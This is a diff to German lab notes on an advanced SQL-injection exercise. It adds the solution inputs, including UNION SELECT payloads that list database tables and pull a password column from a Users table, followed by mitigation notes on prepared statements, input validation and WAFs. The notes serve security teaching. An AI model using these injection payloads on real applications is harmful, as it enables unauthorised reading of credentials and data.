@@ -109,4 +109,25 @@ template: "Template by https://github.com/christopherchristensen & https://githu
 2. Mit Union-Anfrage Daten versuchen auszulesen
 
 ## Lösung zu SQL-Injection Advanced
-* ... 
+* Eingabe 1: `'`
+* Eingabe 2: 
+    - `' UNION SELECT TABLE_NAME AS username` 
+      `FROM INFORMATION_SCHEMA.TABLES` 
+      `WHERE 1=1 or TABLE_NAME='`
+    - `INFORMATION_SCHEMA.TABLES`
+* Eingabe 3: 
+    - `' UNION SELECT pwd AS username FROM Users WHERE username='unionguy' =1 or surname='wrong`
+* Eingabe 4: 
+    - `hash`
+
+## Mitigation von SQL-Injection (Advanced)
+- Prepared Statements helfen
+- Parametrisierte Abfragen zwingend Entwickler dazu,
+    - SQL-Code zuerst zu definieren
+    - Dann, jeden Parameter an Abfrage zu übergeben
+- Ermöglicht Datenbank zwischen Code und Daten zu unterscheiden
+- Weitere Möglichkeiten
+    - Stored Procedures
+    - White List Input Validation
+    - Web Application Firewall (WAF) $\to$ second line of defense
+- Passwörter nicht im Klartext in DB speichern 
